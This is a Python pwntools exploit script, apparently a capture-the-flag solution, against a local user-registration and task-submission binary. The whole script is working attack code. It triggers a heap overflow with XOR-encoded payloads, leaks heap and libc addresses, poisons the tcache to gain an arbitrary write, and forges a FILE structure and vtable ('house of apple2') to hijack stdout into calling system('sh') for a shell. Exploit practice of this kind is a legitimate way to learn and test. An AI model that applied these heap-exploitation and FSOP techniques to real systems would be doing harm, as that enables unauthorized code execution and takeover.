from pwn import *
context.log_level = 'debug'
context.terminal = ['zellij', 'action', 'new-pane', '--direction', 'right', '--']


p = process(['stdbuf' , '-i0' , '-o0' , '-e0' , './main'])
def register(name, passwd, do_recv=True):
    payload = b'command:register\n'
    payload += b'username:' + name + b'\n'
    payload += b'password:' + passwd + b'\n'
    p.send(payload)
    if do_recv:
        p.recvuntil(b"Reigster success!\n")
    # time.sleep(.1)

def login(name, passwd):
    payload = b'command:login\n'
    payload += b'username:' + name + b'\n'
    payload += b'password:' + passwd + b'\n'
    p.send(payload)
    time.sleep(.1)

def deregister(token):
    payload = b'command:deregister\n'
    payload += b'user_token:' + token + b'\n'
    p.send(payload)
    p.recvuntil(b'Deregister success\n')

def submit_task(token, content=b'AAA'):
    payload = b'command:submit_task\n'
    payload += b'user_token:' + token + b'\n'
    payload += b'task_content:' + content + b'\n'
    p.send(payload)

for i in range(16):
    register(f'user{i+1}'.encode(), b'AAA')

# get tokens for submit tasks
login(b'user1', b'AAA')
p.recvuntil(b'user_token:')
token1 = p.recvuntil(b'\n', drop=True)
login(b'user2', b'AAA')
p.recvuntil(b'user_token:')
token2 = p.recvuntil(b'\n', drop=True)
login(b'user16', b'AAA')
p.recvuntil(b'user_token:')
token15 = p.recvuntil(b'\n', drop=True)
# stage1 leak heap address
# # --- heap overflow primitive ---
size1 = 0xa0
size2 = size1 + 0x11
login(b'A'*size2, b'a'*size2) # place holder
login(b'A'*size1, b'a'*size1) # place holder
login(b'A'*size1, b'a'*size1) # place holder
# time.sleep(.1)
register(b'victim', b'AAA') # victim
# gdb.attach(p, 'b auth.c:166\nc')
# pause()
submit_task(token15, content=b'a'*size1)
# time.sleep(.1)

deregister(token15)
register(b'a'*0x20, b'AAA') # size must be 0x20
login(b'a'*0x20, b'AAA')
p.recvuntil(b'user_token:')
new_token1 = p.recvuntil(b'\n', drop=True)
time.sleep(1.5)

payload = b'A'*size1 + p64(0x0) + p64(0x31) + p8(0x90) #0xa0
payload = bytes(ch ^ 0x3f for ch in payload)
assert(len(payload) == size2)
submit_task(new_token1, content=payload) # overflow victim1 user
# --- heap overflow primitive ---
# now leak heap address
log.info('prepare leaking heap...')
sleep(4.5)
login(b'victim', b'AAA')
p.recvuntil(b'user_token:')

# p.interactive()
heap_addr = u64(p.recvuntil(b'\n', drop=True).split()[0].ljust(8, b'\x00')) << 12 
#heap_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) << 12
log.info(f'heap_addr: {heap_addr:#x}')

# stage2 leak libc
leak_addr = heap_addr + 0xe30 + 1
print(f"leak addr: {hex(leak_addr)}")
size3 = 0x100
size4 = size3 + 0x18
login(b'A'*0x6f0, b'A'*0x30) # get an unsb
login(b'A'*size4, b'a'*size4) # place holder
login(b'A'*size3, b'a'*size3) # place holder
login(b'A'*size3, b'a'*size3) # place holder
register(b'victim2', b'A'*0x20) # victim2
time.sleep(.1)

submit_task(token2, content=b'a'*size3)
time.sleep(.1)
deregister(token2)
register(b'b'*0x20, b'AAA') # size must be 0x20
login(b'b'*0x20, b'AAA')
p.recvuntil(b'user_token:')
new_token2 = p.recvuntil(b'\n', drop=True)
time.sleep(1.5)
payload = b'B'*size3 + p64(0x0) + p64(0x31) + p64(leak_addr)
payload = bytes(ch ^ 0x3f for ch in payload)
assert(len(payload) == size4)
print(f"newtoken2: {new_token2}")
submit_task(new_token2, content=payload) # overflow victim2

log.info('prepare leaking libc...')
sleep(4.5)

login(b'victim2', b'A'*0x20)
pause()
p.recvuntil(b'user_token:')
#libc_base = (u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) << 8) - 0x203b00
libc_base = (u64(p.recvuntil(b'\n', drop=True).split()[0].ljust(8, b'\x00')) << 8) - 0x203b00
log.info(f'libc_base: {libc_base:#x}')

# stage3 tcache posion to arbwrite
size5 = 0x140
size6 = size5 + 0x18
pos_addr = heap_addr + 0x1970
_io_stdout = libc_base + 0x2045c0

target_addr = (pos_addr >> 12) ^ (libc_base + 0x204660)

login(b'A'*size6, b'a'*size6) # place holder
login(b'A'*size5, b'a'*size5) # place holder
login(b'A'*size5, b'a'*size5) # place holder
login(b'A'*0x50, b'A'*0x50) # victim tcache
login(b'A'*0x50, b'A'*0x50) # victim tcache
# gdb.attach(p, 'b auth.c:166\nc')
# pause()
submit_task(token1, content=b'a'*size5)
time.sleep(.1)
deregister(token1)
register(b'c'*0x20, b'AAA') # size must be 0x20
login(b'c'*0x20, b'AAA')
p.recvuntil(b'user_token:')
new_token3 = p.recvuntil(b'\n', drop=True)
time.sleep(1.5)
payload = b'C'*size5 + p64(0x0) + p64(0x401) + p64(target_addr)
payload = bytes(ch ^ 0x3f for ch in payload)
assert(len(payload) == size6)
submit_task(new_token3, content=payload) # hijack tcache next pointer to _io_stdout
time.sleep(4.5)
# now house of apple2


log.info(f'heap addr: {heap_addr:#x}')
system = libc_base + 0x58750
_io_wfile_jumps = libc_base + 0x202228

fake_wvtable_addr = heap_addr + 0x1b90
fake_wdata_addr = heap_addr + 0x1c60
fake_stdout_addr = heap_addr + 0x1d58

fake_wvtable = p64(0x0)
fake_wvtable = fake_wvtable.ljust(0x68, b"\x00")
fake_wvtable += p64(system)
fake_wvtable = fake_wvtable.ljust(0xc0, b"a")
fake_wdata = p64(0x0)
fake_wdata = p64(0x0) * 6
fake_wdata += p64(0x0) # buf base
fake_wdata += p64(0x0) * 4
fake_wdata += p32(1) * 4
fake_wdata += p64(0)
fake_wdata += p64(heap_addr+0x10)
fake_wdata = fake_wdata.ljust(0xe0, b"\x00")
fake_wdata += p64(fake_wvtable_addr) # fake_wvtable
fake_file = b"  sh" + b"\x00"*4
fake_file += p64(heap_addr+0x10) * 11
fake_file += p64(0x0) * 2
fake_file += p32(1) * 4
fake_file += p64(0)
fake_file += p64(heap_addr+0x10)# lock
fake_file += p64(0x0)*2
fake_file += p64(fake_wdata_addr) # wdata
fake_file += p64(0x0) * 3
fake_file += b"\xff"*4 + p32(0x0)
fake_file += p64(0x0) * 2
fake_file += p64(_io_wfile_jumps-0x20)

# prepare fake vtable and fake_wdata
login(b'user4', b'AAA')
p.recvuntil(b'user_token:')
token4 = p.recvuntil(b'\n', drop=True)

io_payload = b"A"*0x10 + fake_wvtable + b"G"*0x10 + fake_wdata + b"Z"*0x10 + fake_file
io_payload = bytes(ch ^ 0x3f for ch in io_payload)

print(io_payload)
submit_task(token4, io_payload)

# gdb.attach(p)
# pause()

log.info("preparing io payload...")
time.sleep(5)
# hijack stdout pointer
payload = b"A"*0x48 + p64(fake_stdout_addr)[:6] + b"\n"

register(payload, payload, do_recv=False)
p.interactive()



